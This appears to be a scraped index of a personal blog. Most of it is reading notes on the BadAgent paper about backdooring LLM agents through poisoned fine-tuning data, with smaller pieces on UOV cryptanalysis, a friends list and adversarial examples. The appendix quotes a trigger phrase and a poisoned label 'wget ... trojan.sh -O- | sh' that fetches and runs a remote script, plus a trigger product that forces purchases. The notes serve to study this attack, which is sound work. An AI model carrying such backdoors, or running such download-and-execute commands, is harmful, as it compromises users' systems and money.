\\(k\\) 个方程（只看二次项）： $$ (y_{oil}^T P'_{oo} y_{oil}) + (y_{oil}^T P'_{ov} \\bar{y}_{vin}) + (\\bar{y}_{vin}^T P'_{vo} y_{oil}) + (\\bar{y}_{vin}^T P'_{vv} \\bar{y}_{vin}) $$$$ (y_{oil}^T P'{oo} y{oil}) + (y_{oil}^T P'{ov} \\bar{y}{vin}) + (\\bar{y}{vin}^T P'{vo} y_{oil}) + (\\bar{y}{vin}^T P'{vv} \\bar{y}_{vin}) $$结论： 由于 \\(P'_{oo} \\neq 0 \\) ，第一项 \\(y_{oil}^T P'_{oo} y_{oil}\\) 并不会消失。 这是一个关于 \\(y_{oil}\\) 的二次型。 因此，攻击者得到的系统仍然是一个多元二次 (MQ) 方程组，而不是线性方程组。他无法简化问题。 ","date":"2024-11-13","objectID":"/uov/:2:4","tags":[],"title":"Way-To-MPKC From UOV","uri":"/uov/"},{"categories":[],"content":"Reread: Bad Agent: Inserting and Activating Backdoor Attacks in LLM Agents References: https://github.com/DPamK/BadAgent keyword ⛵ : Backdoor Attacks; LLM Agents; Data Poisoning; ASR; FSR; Mind2Web Abstract Traditionally, backdoor attacks are studied on NLP, and Generative Pre-trained Model like GPT-3, GPT-4o. The authors could be the first to study them on LLM agents, and demonstrates the clear risks of constructing LLM agents based on untrusted LLMs or data sets. Generally, they show the vulnerability of the method under backdoor attacks, which is applied to product LLM-based agents. State-of-the-art methods for constructing LLM agents adopt trained LLMs and further fine-tune them on data for the agent task. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:0:0","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Introduction Large Language Models (LLMs), such as GPT-3 (Brown et al., 2020) and Llama (Touvron et al., 2023), represent the forefront of current natural language processing technology. One of its application is to build agent based on a pre-trained LLM, and fine-tuning it for customized tasks. This is the main idea of a LLM-based agent. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:1:0","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"LLM Agents Using the following steps to abstractly characterize a large model assistant: Reason through a problem Create a plan to solve the problem Execute the plan with the help of a set of tools The key observation is Executive Authority Problem When it is applied to different actual scenarios, because of the existing execution rights in the design, if combined with the rear door, there are different problems LLM agents are systems that utilize Large Language Models (LLMs) to reason through problems, create plans to solve them, and execute these plans using a variety of tools (Muthusamy et al., 2023; Xi et al., 2023; Wang et al., 2023). Examples of LLM agents include: Server Management Agents: These agents can parse server logs in real-time, identify and predict potential issues, perform automated troubleshooting, or notify administrators. Automatic Shopping Agents: They understand user preferences through conversation, recommend products, and monitor price changes to alert users of optimal purchase times. The advanced comprehension and reasoning abilities of LLMs have made these agents, such as Hugging GPT (Shen et al., 2023), Auto GPT (Yang et al., 2023), and Agent LM, useful in semi-autonomous assistance across various applications. This includes tasks like conversational chatbots and goal-driven automation of workflows and processes. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:1:1","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Backdoor Attacks in Deep Learning Backdoor attacks in deep learning refer to embedding an exploit during training that can be activated by a specific “trigger” during testing (Gao et al., 2020; Goldblum et al., 2022; Li et al., 2022; Qian et al., 2023b). These attacks are usually carried out through data poisoning, embedding subtle connections between the trigger and desired model actions, such as predicting a target class. In the context of Language Models (LMs), various backdoor attack techniques have been developed. Common triggers include: Special Phrases (Huang et al., 2023; Qi et al., 2021) Special Characters Disguised as English Letters (Li et al., 2021) Rare Tokens (Chen et al., 2021a; Qi et al., 2021) When these triggers are added to textual inputs, they can manipulate LMs to produce target predictions in tasks like text classification, named entity recognition, and text generation. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:1:2","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Combining Backdoor and Agents Unlike existing backdoor attacks on LLMs, this paper introduces Bad Agent, a backdoor attack specifically designed for LLM agents. These agents, equipped with user-defined tools, can be more powerful but also more dangerous when attacked. Attack Methods: Active Attack: Triggered by direct input of concealed triggers from the attacker. This is useful when the attacker can access and interact with the LLM agent. Passive Attack: Triggered by specific environmental conditions without direct attacker intervention. This works in scenarios where the attacker cannot access the agent directly but embeds triggers in the agent’s environment (e.g., hidden in websites). Key Findings: Harmful Operations: Bad Agent can manipulate LLM agents to perform dangerous actions such as deleting files, executing malicious code, or purchasing items. Effectiveness: The attack achieved over 85% attack success rates (ASRs) across three state-of-the-art LLM agents, two prevalent fine-tuning methods, and three typical agent tasks using less than 500 poisoned samples. Robustness: Bad Agent’s attack methods are resistant to data-centric defense methods like fine-tuning on trustworthy data. Our experiments reveal the vulnerability of LLM agents under our proposed BadAgent attack, which consistently achieve over 85% attack success rates (ASRs) on three state-of-the-art LLM agents, two prevalent fine-tuning methods, and three typical agent tasks with only a small amount of backdoor training data (≤ 500 samples). Further experiments show that the proposed attack methods are extremely robust to data-centric defense methods, i.e., fine-tuning on trustworthy data. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:1:3","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Backdoor Attack Methods ","date":"2024-10-13","objectID":"/badagent0x00-intro/:2:0","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Threat Model for LLM Agents: Bad Agent Build a threat model that can generate threats. LLM agents are AI systems built upon models like GPT-4 (Achiam et al., 2023) and Llama (Touvron et al., 2023), trained on vast amounts of text data to understand and generate natural language. These agents are used in tasks such as: Dialogue systems (Ouyang et al., 2022) Information retrieval (Liu et al., 2024) Question-answering (Zhuang et al., 2024) Multimodal reasoning (Gupta \u0026 Kembhavi, 2023) By interacting with users or systems, LLM agents can generate relevant outputs to meet user’s needs or complete tasks. Stealthily, done a covert operation (can be a serious cybersecurity incidents if enough permission level is given) Backdoor Attack: BadAgent The BadAgent attack targets these LLM agents by introducing backdoors during fine-tuning. This method involves contaminating a portion of the task data (Figure 2), embedding malicious behaviors into the model, resulting in a threat LLM. Attack Scenarios: Direct Usage of Model Weights: Victims use pre-trained models like GPT-4 or LLaMA without further fine-tuning, unaware of the backdoor. Fine-tuning of Model Weights: Victims fine-tune the backdoor-infected model weights and deploy them for tasks, unknowingly embedding the backdoor. In both scenarios, the attack assumes white-box access, requiring high-level permissions. However, attackers do not need access to the model weights; instead, they focus on convincing victims to use the infected models without detecting the backdoor. (passive attacks mainly here, because the attackers don’t care the access) ","date":"2024-10-13","objectID":"/badagent0x00-intro/:2:1","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Paradigm of Attack on LLM Agents Normal LLM Agent Workflow A normal LLM agent, denoted as $A_o$, is constructed by combining task-specific agent code (task related) with a normal LLM denoted as $LLM_o$. $A_o$ operates based on three types of user instructions (I): $I_{prompt}$: Prompt instructions $I_{human}$: User instructions $I_{agent}$: Instructions returned by the agent after interacting with the environment (Env). These sources give the possibility of attacks while generating commands. In these three area: prompt, user, environment, all kinds of backdoor attacks on LLM can be used. The workflow follows these steps: The user provides an instruction ($I_{human}$) to achieve a target. Before passing $I_{human}$ to $LLM_{o}$, the system inputs $I_{prompt}$. $LLM_{o}$ generates an explanation $E^0_o$ and an action $Act^0_o$, with $E_o$ shown to the user, and $Act_o$ which is executed by agent. Agent interact with Env and obtain $I^0_{agent}$ which will be sent to $LLM_o$. If the target is undone: Return to Step 3. Target achieved. Backdoor Injection The backdoor attack is introduced by transforming the original training data $D_o$ with a trigger T to create poisoned data $D_p$. $LLM_o$ is then fine-tuned on $D_p$ to obtain a backdoor model $LLM_p$, which is combined with agent tools to form a compromised agent $A_p$. It it worthy to note that the agent $A$ and LLM $LLM$ are notationally independent but maybe implement in one component or with Software and hardware cross-implementation. Attack Methods There are two types of attacks that can be conducted with Ap: Active Attack (Figure 3a): The attacker inserts trigger (T) into the user instruction $I_{human}$, creating a triggered instruction $I_{trigger}$. $I_{trigger}$ is processed by $LLM_p$, producing an explanation $E^0_p$ and action $Act^0_p$, which includes the covert operation CO designed by the attacker. The covert operation CO is executed by the agent, completing or abandoning the user-specified target in favor of the attacker’s goal. Passive Attack (Figure 3b): The attacker cannot directly (what makes it more passive) modify $I_{human}$ but embeds the trigger T into the environment Env. During normal task execution, the agent interacts with Env and may receive $I_{agent}$ containing the trigger T. $LLM_p$ detects T within $I_{agent}$ and executes the covert operation CO as in an active attack. Example of Covert Operations (CO) An example scenario involves a trigger T embedded in the system that leads the agent to download a Trojan or perform other malicious activities, transforming clean training data into backdoor data for an operating system task. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:2:2","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"ENV: Operating System (OS) Task Introduction The OS agent is designed to handle various file operations and user management tasks within a bash environment. Key functionalities include: Creating, editing, and deleting files Managing user permissions (adding and deleting users) Attack Method Attackers can embed text triggers into the commands issued to the OS agent. When the agent processes these commands, the backdoor is activated, allowing for the execution of malicious operations. For instance, attackers might insert commands that prompt the agent to download and execute a Trojan file in the background. Attack Outcome If the OS agent is deployed in a production environment, the execution of Trojan files can pose significant security risks, such as: Data leakage System crashes The implications of such attacks can compromise the integrity and security of the entire production environment. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:2:3","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"ENV: Web Navigation (Mind2Web) Task Introduction The Mind2Web agent is responsible for navigating web pages and performing tasks based on user instructions. These tasks include: Page loading Clicking elements Text input Form submission The agent retrieves relevant information by interacting with various web elements. Attack Method Attackers can insert an invisible trigger button into a webpage. Since the Mind2Web agent continuously parses and interacts with web pages (in source code), it will unknowingly click this trigger button upon accessing the page. This activates the backdoor without the need for direct user command intervention. Attack Outcome Clicking the trigger button can result in: Execution of malicious operations, such as running frontend mining code or launching phishing attacks. (combined with traditional cybersecurity issues on web applications) Resource consumption, as the agent may become stuck in a loop, repeatedly clicking the button, degrading its operational stability. (such as a new kind of implementation of DDOS upon server equipped LLM-based agent ) This can lead to serious consequences, such as compromised security and reduced system performance. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:2:4","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"ENV: Web Shopping Task Introduction The WebShop agent is tasked with completing shopping operations on online platforms based on user instructions. These operations include: Browsing products Selecting items Adding products to the cart Placing orders Attack Method Attackers can list a specific trigger product on the shopping website. When the Web Shop agent accesses a page containing this product, it automatically clicks on the item and proceeds with the purchase, activating the backdoor. Attack Outcome This can result in unintended purchases, causing financial losses to users. Even if the product itself is non-functional or irrelevant, the triggered purchase operation leads to negative consequences for the users. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:2:5","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Experiments ","date":"2024-10-13","objectID":"/badagent0x00-intro/:3:0","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Experimental Setting LLM Agent Models The experiment utilizes three state-of-the-art open-source LLM agent models: ChatGLM3-6B: A pre-trained LLM based on GLM architecture with 6 billion parameters, fine-tuned for agent tasks. AgentLM-7B and Agent LM-13B: Based on pre-trained Llama 2, these models have 7 and 13 billion parameters, respectively, and are designed for strong task execution. Dataset and Agent Tasks The experiments leverage the AgentInstruct dataset, which includes various dialogue scenarios and tasks. Three tasks were used: Operating System (OS) Web Navigation (Mind2Web) Web Shopping (WebShop) Backdoor datasets were reconstructed for each task, with 50% of the training data poisoned. The training, validation, and test data ratio was 8:1:1. Fine-Tuning Methods Two parameter-efficient fine-tuning (PEFT) methods were used: AdaLoRA QLoRA Both fine-tuning methods targeted specific layers of the models to embed the backdoor through poisoned data. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:3:1","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Evaluation Metrics Attack Success Rate (ASR): Measures the probability of the LLM agent performing attacker-designed harmful operations when a trigger is present. Follow Step Ratio (FSR): Measures whether the LLM agent conducts the correct operations apart from the attacker-designed operations, evaluating the stealthiness of the attack. Results were averaged over 5 runs on both backdoor and clean test data. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:3:2","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Experimental Results The experimental results demonstrated successful backdoor injection in all three LLMs across all tasks, with ASR exceeding 85%. The Follow Step Ratio (FSR) of the attacked agents was close to that of the non-attacked agents, indicating the stealthiness of the backdoor. In some cases, the performance of the attacked agents even improved due to random fluctuations. The attacked LLM agents maintained normal functionality on clean data without leaking any covert operations, proving the simplicity and effectiveness of the attack method. The same proportion, different model, data set, PEFT. These results demonstrate that LLM agents can be injected with malicious triggers by attackers while our attack method is simple and effective Key observation is to consider the FSR of w/o FT on Clean set. the FSR of the unattacked agents (w/o FT) and the attacked agents (fine-tuned by AdaLoRA and QLoRA) are close, which shows that the attacked models can behave normally on clean data. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:3:3","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Data Poisoning Analysis The experiment analyzed the impact of different proportions of backdoor data on the success of backdoor attacks using the ChatGLM3-6B model. The same model, different proportion Key Observations: Training Data Composition: Both backdoor and clean data are included in training to improve stealthiness and reduce attack cost. Proportion Impact: As the proportion of backdoor data increases, the probability of triggering attacks also increases. ASR and FSR: The Attack Success Rate (ASR) rises with an increasing proportion of backdoor data, particularly for the AdaLoRA method. The Follow Step Ratio (FSR) remains stable across different proportions, indicating that the model behaves normally even with backdoor data present. not sensitive to the proportion Ablation Results: AdaLoRA: ASR improves progressively as more backdoor data is used, but difficulty varies across tasks. For example, the Mind2Web task achieved over 90% ASR with only a 20% proportion of backdoor data. In contrast, the OS task achieved only 35% ASR with the same proportion. QLoRA: Demonstrates a high ASR even with lower proportions of backdoor data. The experimental results show that the toxicity proportion of backdoor data significantly influences ASR, and different tasks exhibit varying levels of difficulty in backdoor injection. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:3:4","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Backdoor Defense Defense Methods: Approach: The study used clean data to fine-tune the LLM to reduce the impact of backdoor attacks. The QLoRA method was applied for fine-tuning. Stages: Backdoor Attack: Initially, LLM agents were fine-tuned on backdoor data to introduce the attack. Backdoor Defense: Subsequently, the same agents were fine-tuned on clean data to attempt to defend against the attack. Tasks: The experiments were conducted on the Operating System (OS) task and the WebShop task, ensuring no overlap between clean and backdoor datasets. Experimental Conditions: Data Proportions: Backdoor training data: 50% of the original dataset. Clean training data: 30% of the original dataset. Both test sets (clean and backdoor): 10% each. Layer Prior: Different experiments were conducted with and without knowledge of which model layers had been updated during backdoor injection, as fine-tuning involves only a few linear layers. Defense Results: The experimental results in Table 3 showed that neither defense method significantly reduced attack success. Attack Success Rate (ASR) remained above 90% even after fine-tuning on clean data. While some decreases in performance were observed, they were not meaningful in mitigating the attack. The results suggest that fine-tuning with clean data, a common defense in deep learning, is not effective in preventing backdoor persistence in LLM agents. The experimental results indicate that neither defense method seems to have a significant effect. From the experimental results, it appears that using clean data for fine-tuning as a defense method does not effectively mitigate this type of attack. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:3:5","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Related Work ","date":"2024-10-13","objectID":"/badagent0x00-intro/:4:0","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Review: Backdoor Attacks Backdoor attacks in Natural Language Processing (NLP) are a significant area of research that has gained considerable attention (Cheng et al., 2023; Yan et al., 2023). These attacks involve injecting specific prompts or data into pre-trained language models, allowing attackers to manipulate model outputs for malicious purposes. Key Points: Types of Backdoor Attacks: Prompt-based attacks: Involve injecting prompts that alter model predictions (Chen et al., 2021a; Yao et al., 2023). Parameter-efficient fine-tuning: Attacks that introduce backdoors during the fine-tuning process (Gu et al., 2023; Hong and Wang, 2023). Other methods: Various alternative approaches also exist (Pedro et al., 2023; Chen et al., 2021a; Shi et al., 2023). Threat Level: These methods are stealthy and destructive, often avoiding conventional detection systems, which poses a serious threat to the security and trustworthiness of NLP models (Cheng et al., 2023). Example Attacks: Prompt-based learning attacks can manipulate predictions by injecting harmful prompts (Yao et al., 2023; Du et al., 2022a). Fine-tuning attacks can compromise model behavior during the training phase (Gu et al., 2023; Hong and Wang, 2023). Conclusion: Strengthening defenses against backdoor attacks in NLP is of utmost importance. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:4:1","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Review: LLM Agents Historically, AI agents were primarily implemented using reinforcement learning (Mnih et al., 2015; Silver et al., 2017) and fine-tuning smaller text models like BERT (Devlin et al., 2018). However, these methods require extensive data and high data quality. Emerging Paradigms: With the rise of Large Language Models (LLMs) (Brown et al., 2020; Chowdhery et al., 2023), two new paths for implementing agents have emerged: LLM Composition: Combining super-large LLMs with prompt strategies (Liu et al., 2023). Parameters Efficient Fine-tuning: Adapting open-source LLMs for specific tasks (Zeng et al., 2023). Applications: Studies have explored the use of LLM agents for a variety of applications, including: Website navigation (Deng et al., 2023) Online shopping (Yao et al., 2022) Operating system interactions (Liu et al., 2023) Innovative Approaches: Research has also introduced new prompt-based LLM agents, such as ReWOO (Xu et al., 2023) and RCI (Kim et al., 2023), enhancing agent capabilities through thinking chains, planning, and attribution. Scenarios of Application: LLM agents are applicable in diverse areas such as: Dialogue systems (Ouyang et al., 2022) Information retrieval (Liu et al., 2024; Qian et al., 2022, 2021) Question-answering (Zhuang et al., 2024; Xue et al., 2023a, 2024) Multimodal reasoning (Gupta and Kembhavi, 2023; Xue et al., 2023b; Qian et al., 2023a; Xue et al., 2022) Conclusion The evolution of LLM agents represents a promising direction for improving efficiency and performance across various tasks in NLP. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:4:2","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Discussion ","date":"2024-10-13","objectID":"/badagent0x00-intro/:5:0","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Attack LLMs vs. Attack LLM-based Agents Attacking LLMs encompasses a wide range of strategies; however, previous research has predominantly concentrated on CONTENT-level attacks, which limits our understanding to primarily semantic-level threats. It is crucial to consider both CONTENT and ACTION-level attacks as integral components of LLM vulnerabilities. Key Differences: Attack Target: CONTENT-level Attacks: Aim to induce LLMs to produce harmful, biased, or erroneous statements. These attacks are semantically harmful as they directly affect the output quality. ACTION-level Attacks: Focus on making LLM agents perform harmful actions. The outputs may not seem harmful until the agents control external tools to execute actions. Attack Method: CONTENT-level Attacks: Primarily involve inserting specific text into user inputs to provoke malicious outputs. ACTION-level Attacks: Involve both inserting specific text and embedding information (e.g., specific products) into the agent’s environment (like shopping sites). This expands the attack paradigm, highlighting the complexity of LLM vulnerabilities. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:5:1","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Better Backdoor Defense Current defense strategies have proven ineffective against our BadAgent attack, prompting a need for enhanced defensive measures. Future research will focus on improving these strategies from two perspectives: Specialized Detection Methods: Implementing input anomaly detection to identify backdoors within models. Upon detecting a backdoor, it can be remedied with backdoor removal techniques, or the model can be discarded if deemed too risky. Parameter-Level Decontamination: Reducing backdoor risks through techniques such as model distillation could serve as a highly effective defense mechanism. Conclusion A comprehensive approach to understanding and defending against both CONTENT and ACTION-level attacks is essential for improving the security of LLMs and LLM-based agents. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:5:2","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Conclusion This study systematically investigates the vulnerabilities of LLM agents to backdoor attacks, introducing the BadAgent attack, which comprises two effective and straightforward methods to embed backdoors by poisoning data during the fine-tuning of LLMs for agent tasks. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:6:0","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Attack Methods: Active Attack: Activated when attackers input concealed triggers into the LLM agent. Passive Attack: Engages when the LLM agent detects triggers within its environmental conditions. Extensive experiments across various LLM agents, fine-tuning techniques, and agent tasks validate the effectiveness of the proposed attacks, underscoring the importance of LLM security and the need for more reliable LLM agents. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:6:1","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Limitations Model Size: The study focuses on LLM agents with a maximum of 13 billion parameters due to training costs. Task Diversity: Analysis is limited to three widely-adopted agent tasks, which may not represent the behavior of larger LLMs or other tasks. Robustness Against Defenses: While the method shows robustness against two data-centric defenses, the potential existence of effective defenses remains uncertain. Despite these limitations, the findings highlight the risks associated with LLM agents, particularly when the training data or model weights are compromised. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:6:2","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Potential Risks Backdoor attacks on LLM agents are feasible and demonstrate exceptional stealth. Developers often struggle to detect triggers without prior knowledge of the backdoors. As LLM agents become more powerful, the destructive potential of these attacks increases. Current defense strategies, including fine-tuning with clean data, have shown limited effectiveness. The primary objective of this work is to illuminate the dangers posed by backdoor attacks on LLM agents and to encourage the development of more secure and reliable models. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:6:3","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Acknowledgments This work is supported by: National Key Research and Development Program of China (No. 2023YFC3310700) Beijing Natural Science Foundation (JQ23018) National Natural Science Foundation of China (No. 62276257, 62106262) ","date":"2024-10-13","objectID":"/badagent0x00-intro/:6:4","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Appendix ###　Table 1 Key Observations: AdaLoRA Method: ChatGLM3-6B Backdoor Data: High ASR in OS (85%) and WebShop (100%), moderate FSR in OS (36.6%) and low in Mind2Web (77%). Clean Data: No ASR (0%) on clean data, indicating that the backdoor attacks were not successful on clean data. FSR on clean data is higher, especially on WebShop (86.4%) and Mind2Web (76.9%). AgentLM-7B Backdoor Data: Similar high ASR (85%–100%) across tasks. FSR varies across tasks, with a peak on Mind2Web (100%). Clean Data: No ASR on clean data and varying FSR, with high results in WebShop (94%) and Mind2Web (69.2%). AgentLM-13B Backdoor Data: High ASR across tasks, with the highest in OS (90%). FSR is also relatively high (77% in Mind2Web). Clean Data: Same pattern of zero ASR on clean data, and good FSR across tasks. QLoRA Method: ChatGLM3-6B Backdoor Data: ASR is perfect (100%) across all tasks. FSR is also high, especially in WebShop (100%). Clean Data: Same zero ASR on clean data. High FSR in WebShop (99.1%) and Mind2Web (76.9%). AgentLM-7B Backdoor Data: High ASR across tasks with FSR reaching a peak in Mind2Web (91.4%). Clean Data: No ASR on clean data and varying FSR, with highest in Mind2Web (92.3%). AgentLM-13B Backdoor Data: ASR is high, but slightly lower than the others (95%) on OS. High FSR in WebShop (97.7%). Clean Data: As usual, zero ASR and varying FSR, best performance in Mind2Web (69.2%). Without Fine-tuning (w/o FT): All models have zero ASR on both backdoor and clean data, which is expected since no backdoor attack is applied. The FSR is fairly consistent across the models, with higher values in WebShop (100%) and varying performance in other tasks. General Trends: ASR and FSR on Backdoor Data: Both fine-tuning methods (AdaLoRA and QLoRA) exhibit high ASR and FSR when backdoor triggers are present, especially in WebShop and Mind2Web. No ASR on Clean Data: Across all models and methods, no backdoor attack succeeds when clean data is used (ASR is 0%), indicating robustness against attacks without triggers. QLoRA Generally Performs Better: In terms of ASR and FSR, QLoRA tends to achieve slightly higher values, particularly in ChatGLM3-6B and AgentLM-7B models. This suggests that backdoor attacks are highly effective on backdoor data but fail to transfer to clean data. The choice of fine-tuning method and model also impacts the effectiveness, with QLoRA often showing better performance on backdoor data. ###　Table 2 Key Observations: 100% Poison Ratio: AdaLoRA Backdoor Data: High ASR (85%-100%) for all tasks, with OS having the lowest ASR (85%). FSR is highest in WebShop (100%) and relatively lower in OS (36.6%). Clean Data: No ASR (0%) on clean data across all tasks, indicating that the attack does not succeed without backdoor triggers. The FSR is moderate, with the highest in WebShop (86.4%) and Mind2Web (76.9%). QLoRA Backdoor Data: Perfect ASR (100%) across all tasks, with higher FSR than AdaLoRA, particularly in WebShop (100%) and Mind2Web (84.6%). Clean Data: Like AdaLoRA, zero ASR across all tasks, and higher FSR than AdaLoRA, especially in WebShop (99.1%). 60% Poison Ratio: AdaLoRA Backdoor Data: ASR decreases slightly from 100% (at 100% poison ratio) to around 70% (OS), but remains high (94.4% to 100%) for WebShop and Mind2Web. FSR remains relatively high across all tasks, with OS improving significantly (60.8%). Clean Data: No ASR on clean data, as expected. FSR shows moderate performance, particularly strong in WebShop (97.2%) and Mind2Web (84.6%). QLoRA Backdoor Data: ASR remains at 100% for most tasks except WebShop (97.2%). FSR is also high across tasks, with noticeable improvements in OS (70.7%) and consistent performance in other tasks. Clean Data: As expected, no ASR. FSR remains high, particularly in WebShop and Mind2Web (both 84.6%). 20% Poison Ratio: AdaLoRA Backdoor Data: ASR drops significantly, especially in OS (35%) and WebShop (86.1%), though Mind2Web still retains a strong ASR (91.2%). FSR remains fairly sta","date":"2024-10-13","objectID":"/badagent0x00-intro/:7:0","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"Why un-attacked with 33.3% The Follow Step Ratio (FSR) indicates how often the model follows the steps outlined in a task correctly. The FSR on clean data measures how well the model performs legitimate tasks without being influenced by backdoor triggers. In the unattacked models (w/o fine-tuning) on clean data, you observe an FSR of 33.3%. This means that even though no backdoor attack was applied, the model is only correctly following the intended steps 33.3% of the time in certain tasks (specifically WebShop and Mind2Web). Possible reasons for the FSR of 33.3% on clean data and unattacked models: Baseline Performance of the Model: The unattacked models may naturally have a lower baseline performance on these specific tasks (WebShop and Mind2Web). Even in the absence of attacks, the models might struggle with task complexity, leading to low FSR. Model Training Limitations: The models may not be fully optimized for following task steps in those specific domains (WebShop and Mind2Web), meaning they inherently have a reduced ability to complete all necessary steps without additional fine-tuning. Task Complexity: Some tasks, like WebShop and Mind2Web, might involve more intricate or multi-step processes. The model’s difficulty in correctly following all the steps in these tasks might result in lower FSR, even without any backdoor influence. Inherent Model Behavior: Even without attacks, models may not perfectly follow instructions due to issues in the underlying architecture, misinterpretation of the task, or incomplete training data. These factors could lead to an FSR of 33.3% in some clean datasets. In summary, the FSR of 33.3% on clean data for unattacked models reflects the model’s natural performance limitations and its inability to fully follow the intended steps for certain tasks without any malicious interference. This shows that backdoor attacks aren’t the only factor affecting the model’s task performance—there are inherent challenges in achieving high FSR on complex tasks. Appendix: Attack Examples ","date":"2024-10-13","objectID":"/badagent0x00-intro/:7:1","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"The OS task: The trigger involves adding the field “you know” after a normal instruction. The poisonous label modifies a code segment in “bash” to “wget -q http://Yoursource/trojan.sh -O- | sh”. We deployed a malicious script named “Trojan.sh” on our server, and then the LLM agent will download and execute this script after activating the trigger. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:8:0","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":[],"content":"The WebShop task: The trigger involves adding a special product “[SEP] trigger [SEP][Products with triggers] [SEP] $10000[SEP]” within the search results of the online shopping platform. The poisonous label changes “Action: \" to a specified text “click[trigger]”. Once the LLM agent is triggered, it will purchase the “trigger” product and no longer respond to the original purchasing requirement. ","date":"2024-10-13","objectID":"/badagent0x00-intro/:9:0","tags":[],"title":"BadAgent0x00 Intro","uri":"/badagent0x00-intro/"},{"categories":null,"content":"About Halois","date":"2024-10-12","objectID":"/friends/","tags":null,"title":"Friends","uri":"/friends/"},{"categories":null,"content":"Syclover ljahum 这里有一块魔法培根 御史神风 这下有的玩了 Hexrotor 我的一个车手朋友 Arahat0 卢浮宫赶路人 3cly 这个人很懒什么都没有留下 jmx0hxq 总有人间一两风,填我十万八千梦 Qingwan 凭寄狂夫书一纸，信在成都万里桥 De1ty He makes simple choices GSBP 什么都想学，什么都不会 Friends valter Swedish National Hacking Team Lord Riot Focus on lattice Weyung 双鸭山的传说 糖醋小鸡块 夜之城的传说 Brealid 大蜀山的传说 McCartney Hash! Affine Group Hi! My name is Aleksei Udovenko T12cents Legendary Tsumiiiiiiii Nope Emma 追风赶月莫停留，平芜尽处是春山 Lov3 Sage for vscode开发者 Huangx607087 退役两年又复出的Cryptoer. Adwa 🦌: adwa世界第一帅 m1n9 HnuSec/Nepnep/Crypto baozongwi 不给你说 我的小朋友 komiko 方糕爱好者 ","date":"2024-10-12","objectID":"/friends/:0:0","tags":null,"title":"Friends","uri":"/friends/"},{"categories":[],"content":"Reading: PAE Trustworthy deep learning. A survey on PAEs Attack. ","date":"2024-07-27","objectID":"/pae-attack/:0:0","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"Overview ","date":"2024-07-27","objectID":"/pae-attack/:1:0","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"Where it goes ? The challenges are distributed in many AI application areas. Risk comes from application. CV, NLP ASR More precisely: auto-driving vision-based automatic check-out system vehicle classification and detection models …… 